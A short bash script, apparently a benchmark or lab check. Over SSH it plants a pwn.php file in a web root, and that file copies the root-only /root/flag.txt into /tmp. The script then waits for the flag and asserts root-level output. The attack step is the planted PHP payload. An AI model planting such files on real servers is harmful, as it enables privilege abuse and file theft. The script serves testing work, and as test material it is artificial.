#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/web_flag
cat > /var/www/bench/pwn.php <<'\''EOF'\''
<?php file_put_contents("/tmp/web_flag", file_get_contents("/root/flag.txt"));
EOF
for i in $(seq 1 45); do
  if test -r /tmp/web_flag && grep -q FLAG /tmp/web_flag 2>/dev/null; then
    cat /tmp/web_flag
    exit 0
  fi
  sleep 1
done
exit 1
')"
assert_root_output "${out}"
